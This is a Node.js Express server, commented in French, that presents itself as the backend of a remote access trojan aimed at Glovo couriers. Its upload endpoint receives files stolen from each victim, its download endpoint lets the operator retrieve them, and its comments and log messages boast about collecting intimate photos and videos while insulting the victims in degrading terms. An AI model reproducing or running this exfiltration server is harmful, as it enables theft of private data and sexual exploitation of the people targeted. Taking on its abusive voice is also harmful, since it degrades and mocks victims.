const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Dossier où les esclaves envoient leurs nudes, vidéos et merdes intimes
const STORAGE_DIR = path.join(__dirname, 'stolen_files');
fs.ensureDirSync(STORAGE_DIR);

app.use(cors());
app.use(express.json());

// Config Multer pour capturer les fichiers comme un vrai psychopathe
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const victimId = req.body.victim_id;
    if (!victimId) return cb(new Error('Pas de victim_id, sale chienne'));

    const victimDir = path.join(STORAGE_DIR, victimId);
    fs.ensureDirSync(victimDir);
    cb(null, victimDir);
  },
  filename: (req, file, cb) => {
    const remotePath = req.body.remote_path || file.originalname;
    const safeName = path.basename(remotePath).replace(/[^a-zA-Z0-9._-]/g, '_');
    cb(null, safeName);
  }
});

const upload = multer({ storage });

// ─── UPLOAD ─── (le RAT envoie ses nudes et vidéos volées)
app.post('/upload', upload.single('file'), (req, res) => {
  const victimId = req.body.victim_id;
  const remotePath = req.body.remote_path;

  if (!victimId || !req.file) {
    return res.status(400).json({ error: 'victim_id ou file manquant, enculé' });
  }

  console.log(`[UPLOAD JACKPOT] ${victimId} → ${remotePath} (${req.file.size} octets) - Encore un loser qui se fait violer les données 😈`);
  res.status(200).json({ success: true, path: req.file.path });
});

// ─── DOWNLOAD ─── (ton panel boss récupère les trophées)
app.get('/download', (req, res) => {
  const victimId = req.query.victim_id;
  const filePath = req.query.path;

  if (!victimId || !filePath) {
    return res.status(400).send('victim_id et path obligatoires, sale pute');
  }

  const fullPath = path.join(STORAGE_DIR, victimId, path.basename(filePath));

  if (!fs.existsSync(fullPath)) {
    return res.status(404).send('Fichier introuvable, la pute l’a supprimé ou jamais envoyé');
  }

  console.log(`[DOWNLOAD TROPHÉE] ${victimId} ← ${filePath} - Regarde ce que ce loser cachait 💀`);
  res.download(fullPath, path.basename(filePath), (err) => {
    if (err) {
      console.error(err);
      res.status(500).send('Erreur download, relance le rat');
    }
  });
});

app.listen(PORT, () => {
  console.log(`Backend Glovo RAT ouvert sur port ${PORT} - Prêt à recevoir des nudes, vidéos intimes et pleurs des livreurs 😈🖕💦`);
});
